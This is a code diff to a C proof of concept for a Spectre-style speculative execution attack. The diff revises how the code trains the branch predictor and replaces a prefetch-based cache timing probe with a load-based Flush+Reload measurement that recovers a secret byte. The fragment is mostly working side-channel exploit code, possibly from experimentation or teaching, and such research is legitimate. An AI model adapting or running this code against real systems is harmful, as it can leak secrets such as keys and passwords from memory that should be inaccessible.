@@ -13,7 +13,7 @@
 #define ARRAY_SIZE 256 // number of possible byte values
 #define PAGE_SIZE 4096 // elements in probe_array should be PAGE_SIZE bytes apart to ensure they occupy different cache lines
 #define DELTA 1024
-#define CACHE_HIT_PREFETCH_THRESHOLD 150
+#define CACHE_HIT_THRESHOLD 150
 #define NUM_ITER 50 // number of times to time each character in secret
 
 int buffer_size = 10;
@@ -61,6 +61,7 @@ int main(int argc, char* argv[]) {
 	uint8_t buffer_item = 0;
 	uint8_t guess = 0;
 	unsigned int scores[256];
+	unsigned int junk = 0;
 
 	clock_t start_time, end_time;
 	start_time = clock();
@@ -79,12 +80,14 @@ int main(int argc, char* argv[]) {
 				probe_array[i * PAGE_SIZE + DELTA] = 1;
 			}
 
-			// train the branch predictor to take the branch
-			for(int i=0; i<buffer_size; i++) {
-				_mm_clflush(&buffer_size);	// why is this flush needed...?
-				access_buffer(i);
-			}	
-					
+			for(int t=0; t<NUM_ITER; t++) {
+				// train the branch predictor to take the branch
+				for(int i=0; i<buffer_size; i++) {
+					_mm_clflush(&buffer_size);	// why is this flush needed...?
+					access_buffer(i);
+				}	
+			}
+	
 			_mm_clflush(&size);	
 			flush();
 			
@@ -92,13 +95,13 @@ int main(int argc, char* argv[]) {
 			buffer_item = access_buffer(secret_idx);
 			probe_array[buffer_item * PAGE_SIZE + DELTA] = 1;
 
-			// measure the clflush() instruction for each element
+			// measure access time for each element
 			for(int i=0; i<ARRAY_SIZE; i++) {
 				addr = &probe_array[i * PAGE_SIZE + DELTA];
-				start = rdtsc();
-				_mm_prefetch(addr, 2);
-				total_cycles = rdtsc() - start;
-				if(total_cycles < CACHE_HIT_PREFETCH_THRESHOLD) guess = i;
+				start = __rdtscp(&junk);
+				junk = *addr;	
+				total_cycles = __rdtscp(&junk) - start;
+				if(total_cycles < CACHE_HIT_THRESHOLD) guess = i;
 				//printf("%i: %i\n", i, (int)total_cycles);
 			}
 			// increment the score for this byte
